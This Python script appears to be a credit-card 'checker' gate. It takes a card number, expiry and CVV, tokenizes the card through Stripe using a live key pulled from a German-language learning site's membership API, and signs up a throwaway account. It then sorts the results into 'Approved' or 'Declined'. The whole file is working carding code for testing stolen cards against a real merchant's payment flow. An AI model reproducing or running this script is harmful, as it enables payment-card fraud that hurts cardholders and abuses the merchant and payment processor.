import requests, re, json
import random
import string


def gate(cc, mes, ano, cvv):
    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 15))) + '@gmail.com'
    
    headers_1 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
    r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()

    key = r1['stripeKey']

    headers_2 = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    payload_2 = "card[number]="+cc+"&card[cvc]="+cvv+"&card[exp_month]="+mes+"&card[exp_year]="+ano+"&card[address_zip]=10080&guid=be4afc94-acab-478a-9565-d5d5b65993d04e31b9&muid=df174d16-9e01-4b04-8bc3-5d4576cd363307473d&sid=0def9619-4d5b-4e53-8a98-91e666914b7846c43a&payment_user_agent=stripe.js%2F0d3c53128%3B+stripe-js-v3%2F0d3c53128&time_on_page=56025&key=pk_live_fLf50cDx65QXSdm6D9YbCwsx&_stripe_account="+key+""
    r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
    r2 = r_2.json()
    r2_text = r_2.text

    print(r2_text)
   
    if 'declined' in r2_text:
        return "Declined"
    else:
        tok = r2['id']
        headers_3 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
        payload_3 = '{"site":"3d821376ab5cea803122c65b3572cff0","additionalFields":{"language":"German","level":"A2"},"email":"'+email+'","password":"Geho1902","membership":"62a0fa8eb4c4ff0004822daf","token":"'+tok+'","couponId":""}'
        r = requests.post('https://api.memberstack.io/member/signup', headers=headers_3, data=payload_3)
        #r3 = r.json()
        result = r.text
        print(result)
        if 'cvc' in result:
            return "Approved"
        elif 'token' in result:
            return "Approved"
        elif 'Cloudflare' in result:
            return "Proxy error, vuelve a iniciar"
        else:
            return "Declined"
